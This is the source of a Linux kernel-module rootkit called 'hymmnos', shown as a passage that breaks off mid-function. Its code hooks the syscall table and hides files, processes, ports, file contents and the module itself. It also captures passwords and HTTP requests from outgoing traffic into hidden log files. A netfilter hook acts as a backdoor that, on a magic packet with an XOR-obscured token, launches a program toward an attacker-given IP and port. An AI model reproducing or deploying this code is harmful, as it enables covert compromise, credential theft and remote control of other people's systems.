#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/workqueue.h>
#include <linux/init.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/string.h>
#include <linux/fs_struct.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <net/tcp.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
#define AR_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
#define AR_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

#define bzero(b, len) (memset((b), '\0', (len)), (void)0)
#define SIGROOT 48
#define SIGHIDEPROC 49
#define SIGHIDEHYMMNOS 50
#define SIGHIDECONTENT 51
#define SIGBACKDOOR 52
#define SIGKOMON 53
#define SSIZE_MAX 32767

//beginning of the rootkit's configuration
#define FILE_SUFFIX ".reyvateil"  //hiding files with names ending on defined suffix
#define COMMAND_CONTAINS "ceil"   //hiding processes which cmdline contains defined text
#define ROOTKIT_NAME "hymmnos"    //you need to type here name of this module to make this module hidden
#define SYSCALL_MODIFY_METHOD CR0 //method of making syscall table writeable, CR0 or PAGE_RW
#define DEBUG 0
#define HIDETAGIN "<touwaka>" //hiding the file content start
#define HIDETAGOUT "</touwaka>" //hiding the file content end, the content between start and end will be hidden
#define SHELL "/home/flysoar/test" //when receive the special packet, will execute this cmd
#define TCPPORT 7777 //backdoor tcp port
#define UDPPORT 7777 //bcakdoor udp port
#define TOKEN "tonelico" //backdoor token
#define WORKNAME "ceil" //workqueue name, should be hidden
//end of configuration

#define BEGIN_BUF_SIZE 10000
#define LOG_SEPARATOR "\n.............................................................\n"
#define CMDLINE_SIZE 1000
#define MAX_DIRENT_READ 10000

#define CR0 0
#define PAGE_RW 1

#define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))

#define set_afinfo_seq_op(op, path, afinfo_struct, new, old) \
    do                                                       \
    {                                                        \
        struct file *filp;                                   \
        afinfo_struct *afinfo;                               \
                                                             \
        filp = filp_open(path, O_RDONLY, 0);                 \
        if (IS_ERR(filp))                                    \
        {                                                    \
            old = NULL;                                      \
        }                                                    \
        else                                                 \
        {                                                    \
                                                             \
            afinfo = PDE_DATA(filp->f_path.dentry->d_inode); \
            old = afinfo->seq_ops.op;                        \
            afinfo->seq_ops.op = new;                        \
                                                             \
            filp_close(filp, 0);                             \
        }                                                    \
    } while (0)

DEFINE_MUTEX(log_mutex_pass);
DEFINE_MUTEX(log_mutex_http);

#define EMBEDDED_NAME_MAX (PATH_MAX - offsetof(struct filename, iname))

struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[1];
};

unsigned long **sys_call_table_;
unsigned long original_cr0;

asmlinkage long (*ref_sys_getdents)(unsigned int,
                                    struct linux_dirent __user *, unsigned int);
asmlinkage long (*ref_sys_getdents64)(unsigned int,
                                      struct linux_dirent64 __user *, unsigned int);
asmlinkage long (*ref_sys_sendto)(int, void __user *, size_t, unsigned,
                                  struct sockaddr __user *, int);
asmlinkage long (*ref_sys_open)(const char __user *filename,
                                int flags, umode_t mode);
asmlinkage long (*ref_sys_readlink)(const char __user *path,
                                    char __user *buf, int bufsiz);
asmlinkage ssize_t (*ref_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage int (*ref_sys_kill)(pid_t pid, int sig);

int (*ref_seq_show)(struct seq_file *seq, void *v);

/*functions for r/w files copied from stackoverflow*/
struct file *file_open(const char *path, int flags, int rights)
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());

    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp))
    {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

void file_close(struct file *file)
{
    if (file)
        filp_close(file, NULL);
}

int file_read(struct file *file, unsigned long long offset,
              unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_read(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_write(struct file *file, unsigned long long offset,
               const unsigned char *data, unsigned int size)
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = vfs_write(file, data, size, &offset);

    set_fs(oldfs);
    return ret;
}

int file_sync(struct file *file)
{
    vfs_fsync(file, 0);
    return 0;
}

/*end of functions for r/w files copied from stackoverflow*/

//set a page writeable
int make_rw(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte |= _PAGE_RW;
    return 0;
}

//set a page read only
int make_ro(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

char *read_whole_file(struct file *f, int *return_read)
{
    int buf_size = BEGIN_BUF_SIZE;
    int res;
    int read = 0;
    char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
    char *buf_old = NULL;
    if (buf == NULL)
        return NULL;

    res = file_read(f, read, buf + read, buf_size - read);
    while (res > 0)
    {
        read += res;
        if (read == buf_size)
        {
            buf_size = buf_size * 2;
            buf_old = buf;
            buf = krealloc(buf, buf_size + 1, GFP_KERNEL);
            if (buf == NULL)
            {
                kfree(buf_old);
                return NULL;
            }
        }
        res = file_read(f, read, buf + read, buf_size - read);
    }
    if (return_read)
        *return_read = read;
    buf[read] = 0;
    return buf;
}

char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
{
    int buf_size = n;
    int res;
    int read = 0;
    char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
    if (buf == NULL)
        return NULL;

    res = file_read(f, read, buf + read, buf_size - read);
    while (res > 0)
    {
        read += res;
        res = file_read(f, read, buf + read, buf_size - read);
    }
    if (return_read)
        *return_read = read;
    buf[read] = 0;
    return buf;
}

//check if file ends on suffix
int check_file_suffix(const char *name)
{
    int len = strlen(name);
    int suffix_len = strlen(FILE_SUFFIX);
    if (len >= suffix_len)
    {
        const char *check_suffix = name;
        check_suffix += len - suffix_len;
        if (strcmp(check_suffix, FILE_SUFFIX) == 0)
            return 1;
    }
    return 0;
}

int is_int(const char *data)
{
    if (data == NULL)
        return 0;
    while (*data)
    {
        if (*data < '0' || *data > '9')
            return 0;
        data++;
    }
    return 1;
}

//for hiden process and file
//===================================

struct pid_list
{
    long pid;
    struct pid_list *next;
    struct pid_list *prev;
};

struct pid_list *first_pid;

int is_pid_hidden(long pid)
{
    struct pid_list *i_ptr = first_pid;
    while (i_ptr)
    {
        if (i_ptr->pid == pid)
            return 1;
        i_ptr = i_ptr->next;
    }
    return 0;
}

void make_pid_hidden(long pid)
{
    struct pid_list *new_pid = NULL;

    if (is_pid_hidden(pid))
        return;

    new_pid = kmalloc(sizeof(struct pid_list), GFP_KERNEL);
    if (new_pid == NULL)
        return;

    new_pid->next = first_pid;
    new_pid->prev = NULL;
    new_pid->pid = pid;
    if (first_pid != NULL)
        first_pid->prev = new_pid;
    first_pid = new_pid;
}

void make_pid_show(long pid)
{
    struct pid_list *i_ptr = first_pid;
    while (i_ptr)
    {
        if (i_ptr->pid == pid)
        {
            if (i_ptr->prev)
                i_ptr->prev->next = i_ptr->next;
            else
                first_pid = i_ptr->next;
            if (i_ptr->next)
                i_ptr->next->prev = i_ptr->prev;
            kfree(i_ptr);
            return;
        }
        i_ptr = i_ptr->next;
    }
    return;
}

void clean_hidden_pids(void)
{
    struct pid_list *i_ptr = first_pid;
    struct pid_list *tmp;

    while (i_ptr)
    {
        tmp = i_ptr;
        i_ptr = i_ptr->next;
        kfree(tmp);
    }
}

int check_process_name(const char *name)
{
    int err;
    long pid;
    char *path = NULL;
    struct file *f = NULL;
    char *buf = NULL;
    int res = 0;
    int read;

    err = kstrtol(name, 10, &pid);
    if (err != 0)
        goto end;


    path = kzalloc(strlen("/proc/") + strlen(name) + strlen("/comm") + 1, GFP_KERNEL);

    if (path == NULL)
        goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/comm");

    f = file_open(path, O_RDONLY, 0);
    if (f == NULL)
        goto end;

    buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);

    if (buf == NULL)
        goto end;

    //printk(KERN_INFO "check name %s\n", buf);
    if (strstr(buf, COMMAND_CONTAINS))
    {
        if (DEBUG)
            printk(KERN_INFO "hiding %s\n", buf);
        res = 1;
    }

end:
    if (f)
        file_close(f);
    kfree(buf);
    kfree(path);
    return res;
}

int check_process_prefix(const char *name)
{
    int err;
    long pid;
    char *path = NULL;
    struct file *f = NULL;
    char *buf = NULL;
    int res = 0;
    int read;
    int i;

    if (!is_int(name))
        goto end;

    err = kstrtol(name, 10, &pid);
    if (err != 0)
        goto end;

    if (is_pid_hidden(pid))
        return 1;

    if (check_process_name(name))
        return 1;

    path = kzalloc(strlen("/proc/") + strlen(name) + strlen("/cmdline") + 1, GFP_KERNEL);

    if (path == NULL)
        goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/cmdline");

    f = file_open(path, O_RDONLY, 0);
    if (f == NULL)
        goto end;

    buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);

    if (buf == NULL)
        goto end;

    for (i = 0; i < read; i++)
    {
        if (buf[i] == 0)
            buf[i] = ' '; //cmdline is in format argv[0]\x00argv[1] ....
    }

    if (strstr(buf, COMMAND_CONTAINS))
    {
        if (DEBUG)
            printk(KERN_INFO "hiding %s\n", buf);
        res = 1;
    }

end:
    if (f)
        file_close(f);
    kfree(buf);
    kfree(path);
    return res;
}

int check_file_name(const char *name)
{
    return strcmp(name, ROOTKIT_NAME) == 0;
}

int should_be_hidden(const char *name)
{
    return check_file_suffix(name) | check_process_prefix(name) |
           check_file_name(name);
}

asmlinkage long new_sys_getdents(unsigned int fd,
                                 struct linux_dirent __user *dirent, unsigned int count)
{
    int ret = ref_sys_getdents(fd, dirent, count);
    unsigned short p = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdir, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    kdir = kzalloc(ret, GFP_KERNEL);
    if (kdir == NULL)
        return ret;

    if (copy_from_user(kdir, dirent, ret))
        goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        p = 1;

    while (off < ret)
    {
        dir = (void *)kdir + off;
        if (should_be_hidden((char *)dir->d_name))
        {
            //printk(KERN_INFO "hiden %s\n", dir->d_name);
            if (dir == kdir)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    if (copy_to_user(dirent, kdir, ret))
        goto end;

end:
    kfree(kdir);
    return ret;
}

asmlinkage long new_sys_getdents64(unsigned int fd,
                                   struct linux_dirent64 __user *dirent, unsigned int count)
{
    int ret = ref_sys_getdents64(fd, dirent, count);
    unsigned short p = 0;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdir, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    kdir = kzalloc(ret, GFP_KERNEL);
    if (kdir == NULL)
        return ret;

    if (copy_from_user(kdir, dirent, ret))
        goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        p = 1;

    while (off < ret)
    {
        dir = (void *)kdir + off;
        if (should_be_hidden((char *)dir->d_name))
        {
            if (dir == kdir)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    if (copy_to_user(dirent, kdir, ret))
        goto end;

end:
    kfree(kdir);
    return ret;
}

//================================================

//for log net packet
//======================================

void save_to_log(const char *log_type, const char *what, size_t size)
{
    int err;
    struct file *f = NULL;
    long long file_size;
    struct path p;
    struct kstat ks;
    char *full_path = kzalloc(strlen("/etc/") + strlen(log_type) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);
    current->flags |= PF_SUPERPRIV;

    if (full_path == NULL)
        goto end;

    strcpy(full_path, "/etc/");
    strcat(full_path, log_type);
    strcat(full_path, FILE_SUFFIX);

    if (DEBUG)
        printk(KERN_INFO "saving to log\n");

    f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
    if (f == NULL)
        goto end;

    kern_path(full_path, 0, &p);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
    err = vfs_getattr(&p, &ks, 0xFFFFFFFF, 0);
#else
    err = vfs_getattr(&p, &ks);
#endif

    if (err)
        goto end;

    if (DEBUG)
        printk(KERN_INFO "size: %lld\n", ks.size);
    file_size = ks.size;
    err = file_write(f, file_size, what, size);
    if (err == -EINVAL)
        goto end;

    file_size += size;
    err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
    if (err == -EINVAL)
        goto end;

    if (DEBUG)
        printk(KERN_INFO "ok\n");

end:
    if (f)
        file_close(f);
    kfree(full_path);
    current->flags |= PF_SUPERPRIV;
}

int password_found(const char *buf, size_t size)
{
    if (strnstr(buf, "password=", size))
        return 1;
    if (strnstr(buf, "pass=", size))
        return 1;
    if (strnstr(buf, "haslo=", size)) //password in polish
        return 1;
    return 0;
}

int http_header_found(const char *buf, size_t size)
{
    if (strnstr(buf, "POST /", size))
        return 1;
    if (strnstr(buf, "GET /", size))
        return 1;
    return 0;
}

asmlinkage long new_sys_sendto(int fd, void __user *buff_user, size_t len,
                               unsigned int flags, struct sockaddr __user *addr, int addr_len)
{

    char *buff = kmalloc(len, GFP_KERNEL);
    if (buff == NULL)
        goto end;

    if (copy_from_user(buff, buff_user, len))
        goto end;

    if (password_found(buff, len))
    {
        if (DEBUG)
            printk(KERN_INFO "password found\n");
        mutex_lock(&log_mutex_pass);
        save_to_log("passwords", buff, len);
        mutex_unlock(&log_mutex_pass);
    }

    if (http_header_found(buff, len))
    {
        if (DEBUG)
            printk(KERN_INFO "http found\n");
        mutex_lock(&log_mutex_http);
        save_to_log("http_requests", buff, len);
        mutex_unlock(&log_mutex_http);
    }

end:
    if (buff)
        kfree(buff);

    return ref_sys_sendto(fd, buff_user, len, flags, addr, addr_len);
}

//================================================

//for hiden port
//=========================================

struct inode_list
{
    long inode;
    struct inode_list *next;
};

struct inode_list *first_inode;

int is_inode_hidden(long inode)
{
    struct inode_list *i_ptr = first_inode;
    while (i_ptr)
    {
        if (i_ptr->inode == inode)
            return 1;
        i_ptr = i_ptr->next;
    }
    return 0;
}

void make_inode_hidden(long inode)
{
    struct inode_list *new_inode = NULL;

    if (is_inode_hidden(inode))
        return;

    new_inode = kmalloc(sizeof(struct inode_list), GFP_KERNEL);
    if (new_inode == NULL)
        return;

    new_inode->next = first_inode;
    new_inode->inode = inode;
    first_inode = new_inode;
}

void clean_hidden_inodes(void)
{
    struct inode_list *i_ptr = first_inode;
    struct inode_list *tmp;

    while (i_ptr)
    {
        tmp = i_ptr;
        i_ptr = i_ptr->next;
        kfree(tmp);
    }
}

//copied from netstat.c (and slightly modified)

#define PRG_SOCKET_PFX "socket:["
#define PRG_SOCKET_PFXl (strlen(PRG_SOCKET_PFX))

static void extract_type_1_socket_inode(const char lname[], long *inode_p)
{

    /* If lname is of the form "socket:[12345]", extract the "12345"
       as *inode_p.  Otherwise, return -1 as *inode_p.
       */

   // printk(KERN_INFO "extracting %s\n", lname);
    if (strlen(lname) < PRG_SOCKET_PFXl + 3)
        *inode_p = -1;
    else if (memcmp(lname, PRG_SOCKET_PFX, PRG_SOCKET_PFXl))
        *inode_p = -1;
    else if (lname[strlen(lname) - 1] != ']')
        *inode_p = -1;
    else
    {
        char inode_str[strlen(lname + 1)]; /* e.g. "12345" */
        const int inode_str_len = strlen(lname) - PRG_SOCKET_PFXl - 1;
        int err;

        strncpy(inode_str, lname + PRG_SOCKET_PFXl, inode_str_len);
        inode_str[inode_str_len] = '\0';
        err = kstrtol(inode_str, 10, inode_p);
        if (err || *inode_p < 0 || *inode_p >= INT_MAX)
            *inode_p = -1;
    }
}

int load_inodes_of_process(const char *name)
{
    char *path = NULL;
    int path_len;
    long fd;
    long read;
    long bpos;
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;

    if (DEBUG)
        printk(KERN_INFO "collecting descriptors of %s\n", name);

    path_len = strlen("/proc/") + strlen(name) + strlen("/fd");
    path = kmalloc(path_len + 1, GFP_KERNEL);
    if (!path)
        goto end;

    strcpy(path, "/proc/");
    strcat(path, name);
    strcat(path, "/fd");

    fd = ref_sys_open(path, O_RDONLY | O_DIRECTORY, 0);

    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);
    if (!dirent)
        goto end;

    //listing directory /proc/[id]/fd
    //and then, calling readlink which returns inode of socket
    //dirent is a memory allocated in kernel space, it should be in user space but it works thanks to set_fs(KERNEL_DS);
    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
    if (read <= 0)
        goto end;

    for (bpos = 0; bpos < read;) //todo
    {
        d = (struct linux_dirent *)((char *)dirent + bpos);
        if (d->d_ino != 0)
        {
            //printk(KERN_INFO "find %s in %s\n", d->d_name, name);
            if (strcmp(d->d_name, "0") && strcmp(d->d_name, "1") && strcmp(d->d_name, "2") && strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
            {
                char lname[30];
                char line[40];
                int lnamelen;
                long inode;

                snprintf(line, sizeof(line), "%s/%s", path, d->d_name);
                //printk(KERN_INFO "find %s\n", line);
                lnamelen = ref_sys_readlink(line, lname, sizeof(lname) - 1);
                if (lnamelen == -1)
                {
                    bpos += d->d_reclen;
                    continue;
                }
                lname[MIN(lnamelen, sizeof(lname) - 1)] = '\0';
                extract_type_1_socket_inode(lname, &inode);
                if (inode != -1)
                    make_inode_hidden(inode);
            }
        }
        bpos += d->d_reclen;
    }

end:
    kfree(dirent);
    kfree(path);
    return 0;
}

void load_inodes_to_hide(void)
{
    //enum /proc
    struct linux_dirent *dirent = NULL;
    struct linux_dirent *d;
    mm_segment_t old_fs;
    long fd, read, bpos;

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    fd = ref_sys_open("/proc", O_RDONLY | O_DIRECTORY, 0);
    if (fd < 0)
        return;

    dirent = kmalloc(MAX_DIRENT_READ, GFP_KERNEL);
    if (!dirent)
        goto end;

    read = ref_sys_getdents(fd, dirent, MAX_DIRENT_READ);
    if (read <= 0)
        goto end;

    //for every process:
    //check if this process should be hidden
    //if so, get list of inodes of fd's, and save them for further processing

    for (bpos = 0; bpos < read;)
    {
        d = (struct linux_dirent *)((char *)dirent + bpos);
        if (d->d_ino != 0)
        {
            if (should_be_hidden((char *)d->d_name))
                load_inodes_of_process((char *)d->d_name);
        }
        bpos += d->d_reclen;
    }

    set_fs(old_fs);

end:
    set_fs(old_fs);
    kfree(dirent);
}

char *next_column(char *ptr)
{
    while (*ptr != ' ')
        ptr++;
    while (*ptr == ' ')
        ptr++;
    return ptr;
}

int new_seq_show(struct seq_file *seq, void *v)
{
    int ret;
    char *net_buf = NULL;
    char *line_ptr;
    mm_segment_t oldfs;

    int i;
    char *column;
    char *space;
    long inode;
    int err;


    load_inodes_to_hide();
    ret = ref_seq_show(seq, v);
    
    oldfs = get_fs();
    set_fs(get_ds());

    net_buf = seq->buf + seq->count - 150;
    if (net_buf == NULL)
        goto end;

    column = net_buf;
    for (i = 0; i < 10; i++)
        column = next_column(column);

    space = strchr(column, ' ');
    if (!space) //file is not in a proper format
        goto end;
    *space = 0;
    err = kstrtol(column, 10, &inode);
    *space = ' ';
    if (err)
        goto end;

    if (is_inode_hidden(inode))
    {
        seq->count -= 150;
    }

    goto end;

end:
    set_fs(oldfs);
    return ret;
}

//===============================================

//for hiden content
//=============================================

int hide_file_content = 1;
atomic_t read_on;

int f_check(void *arg, ssize_t size)
{
    char *buf;

    if ((size <= 0) || (size >= SSIZE_MAX))
        return (-1);

    buf = (char *)kmalloc(size + 1, GFP_KERNEL);
    if (!buf)
        return (-1);

    if (copy_from_user((void *)buf, (void *)arg, size))
        goto out;

    buf[size] = 0;

    if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL))
    {
        kfree(buf);
        return (1);
    }
out:
    kfree(buf);
    return (-1);
}

int hide_content(void *arg, ssize_t size)
{
    char *buf, *p1, *p2;
    int i, newret;

    buf = (char *)kmalloc(size, GFP_KERNEL);
    if (!buf)
        return (-1);

    if (copy_from_user((void *)buf, (void *)arg, size))
    {
        kfree(buf);
        return size;
    }

    p1 = strstr(buf, HIDETAGIN);
    p2 = strstr(buf, HIDETAGOUT);
    p2 += strlen(HIDETAGOUT);

    if (p1 >= p2 || !p1 || !p2)
    {
        kfree(buf);
        return size;
    }

    i = size - (p2 - buf);
    memmove((void *)p1, (void *)p2, i);
    newret = size - (p2 - p1);

    if (copy_to_user((void *)arg, (void *)buf, newret))
    {
        kfree(buf);
        return size;
    }

    kfree(buf);
    return newret;
}

struct file *e_fget_light(unsigned int fd, int *fput_needed)
{
    struct file *file;
    struct files_struct *files = current->files;

    *fput_needed = 0;
    if (likely((atomic_read(&files->count) == 1)))
    {
        file = fcheck(fd);
    }
    else
    {
        spin_lock(&files->file_lock);
        file = fcheck(fd);
        if (file)
        {
            get_file(file);
            *fput_needed = 1;
        }
        spin_unlock(&files->file_lock);
    }
    return file;
}

asmlinkage ssize_t new_sys_read(unsigned int fd, char __user *buf, size_t count)
{
    struct file *f;
    int fput_needed;
    ssize_t ret;

    if (hide_file_content)
    {
        ret = -EBADF;

        atomic_set(&read_on, 1);
        f = e_fget_light(fd, &fput_needed);

        if (f)
        {
            ret = vfs_read(f, buf, count, &f->f_pos);
            if (f_check(buf, ret) == 1)
                ret = hide_content(buf, ret);

            fput_light(f, fput_needed);
        }
        atomic_set(&read_on, 0);
    }
    else
    {
        ret = ref_sys_read(fd, buf, count);
    }

    return ret;
}

//=============================================

//for backdoor
//=============================================

struct workqueue_struct *work_queue;
static struct nf_hook_ops magic_packet_hook_options;
int is_net_backdoor = 0;

struct shell_task
{
    struct work_struct work;
    char *path;
    char *ip;
    char *port;
};

void s_xor(char *arg, int key, int nbytes)
{
    int i;
    for (i = 0; i < nbytes; i++)
        arg[i] ^= key;
}

int atoi(char *str)
{
    int i, result = 0;
    for (i = 0; str[i] != '\0'; i++)
        result = result * 10 + str[i] - '\0';

    return result;
}

void exec(char **argv)
{
    static char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

void shell_execer(struct work_struct *work)
{
    struct shell_task *task = (struct shell_task *)work;
    char *argv[] = {task->path, "-a", task->ip, "-p", task->port, NULL};

    exec(argv);
    //kfree(task->path);
    //kfree(task->ip);
    //kfree(task->port);
    kfree(task);
    //printk(KERN_INFO "finish shell execer\n");
}

int shell_exec_queue(char *path, char *ip, char *port)
{
    struct shell_task *task;

    task = kmalloc(sizeof(*task), GFP_KERNEL);

    if (!task)
        return -1;

    AR_INIT_WORK(&task->work, &shell_execer);
    task->path = kstrdup(path, GFP_KERNEL);
    if (!task->path)
    {
        kfree(task);
        return -1;
    }

    task->ip = kstrdup(ip, GFP_KERNEL);
    if (!task->ip)
    {
        kfree(task->path);
        kfree(task);
        return -1;
    }

    task->port = kstrdup(port, GFP_KERNEL);
    if (!task->port)
    {
        kfree(task->path);
        kfree(task->ip);
        kfree(task);
        return -1;
    }

    return queue_work(work_queue, &task->work);
}

void decode_n_spawn(const char *data)
{
    int tsize;
    char *ip, *port, *p = NULL, *buf = NULL, *tok = NULL, *token = TOKEN;

    tsize = strlen(token);
    p = (char *)kmalloc(tsize + 24, GFP_KERNEL);
    if (!p)
        return;

    buf = p; // save the base pointer to free it right

    bzero(buf, tsize + 24);
    memcpy(buf, data, tsize + 24);
    s_xor(buf, 11, strlen(buf));
    tok = buf;
    strsep(&buf, " ");
    ip = buf;
    strsep(&buf, " ");
    port = buf;
    strsep(&buf, " ");

    if (!tok || !ip || !port)
        goto out;

    if (strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15)
        shell_exec_queue(SHELL, ip, port);

out:
    kfree(p);
}

unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer,
                               const struct net_device *in, const struct net_device *out,
                               int (*okfn)(struct sk_buff *))
{

    const struct iphdr *ip_header;
    const struct icmphdr *icmp_header;
    const struct tcphdr *tcp_header;
    const struct udphdr *udp_header;
    struct iphdr _iph;
    struct icmphdr _icmph;
    struct tcphdr _tcph;
    struct udphdr _udph;
    const char *data;
    char token[strlen(TOKEN) + 1];
    int tsize;
    char _dt[strlen(TOKEN) + 12];

    strcpy(token, TOKEN);
    tsize = strlen(token);

    s_xor(token, 11, tsize);

    ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);

    if (!ip_header)
        return NF_ACCEPT;

    if (ip_header->protocol == IPPROTO_ICMP)
    {
        icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);

        if (!icmp_header)
            return NF_ACCEPT;

        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);

        if (!data)
            return NF_ACCEPT;

        if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0))
        {
            decode_n_spawn(data);
            return NF_DROP;
        }
    }

    if (ip_header->protocol == IPPROTO_TCP)
    {
        tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);

        if (!tcp_header)
            return NF_ACCEPT;

        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);

        if (!data)
            return NF_ACCEPT;

        if (htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0)
        {
            decode_n_spawn(data);
            return NF_DROP;
        }
    }

    if (ip_header->protocol == IPPROTO_UDP)
    {
        udp_header = skb_header_pointer(socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);

        if (!udp_header)
            return NF_ACCEPT;

        data = skb_header_pointer(socket_buffer, ip_header->ihl * 4 + sizeof(struct udphdr), sizeof(_dt), &_dt);

        if (!data)
            return NF_ACCEPT;

        if (htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0)
        {
            decode_n_spawn(data);
            return NF_DROP;
        }
    }
    return NF_ACCEPT;
}

void regist_backdoor(void)
{
    if (is_net_backdoor)
        return;
    is_net_backdoor = 1;
    magic_packet_hook_options.hook = (void *)magic_packet_hook;
    magic_packet_hook_options.hooknum = 0;
    magic_packet_hook_options.pf = PF_INET;
    magic_packet_hook_options.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_register_net_hook(&init_net, &magic_packet_hook_options);
#else
    nf_register_hook(&magic_packet_hook_options);
#endif
}

void unregist_backdoor(void)
{
    if (is_net_backdoor == 0)
        return;
    is_net_backdoor = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
    nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
#else
    nf_unregister_hook(&magic_packet_hook_options);
#endif
}
//===============================================

// for hidden itself
//===============================================

int hidden = 0;
static struct list_head *mod_list;

void hide(void)
{
    if (hidden)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    mod_list = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    mutex_unlock(&module_mutex);
    hidden = 1;
}

void show(void)
{
    if (!hidden)
        return;

    while (!mutex_trylock(&module_mutex))
        cpu_relax();
    list_add(&THIS_MODULE->list, mod_list);
    mutex_unlock(&module_mutex);
    hidden = 0;
}
//===============================================

//for kernel monitor, TODO
//===============================================

int module_notifier(struct notifier_block *nb,
                    unsigned long action, void *data);

struct notifier_block nb = {
    .notifier_call = module_notifier,
    .priority = INT_MAX};
int is_komon = 0;

int fake_init(void)
{
    if (DEBUG)
        printk(KERN_INFO "%s\n", "Fake init.");

    return 0;
}

void fake_exit(void)
{
    if (DEBUG)
        printk(KERN_INFO "%s\n", "Fake exit.");

    return;
}

int module_notifier(struct notifier_block *nb,
                    unsigned long action, void *data)
{
    struct module *module;
    unsigned long flags;
    DEFINE_SPINLOCK(module_notifier_spinlock);

    module = data;
    if (DEBUG)
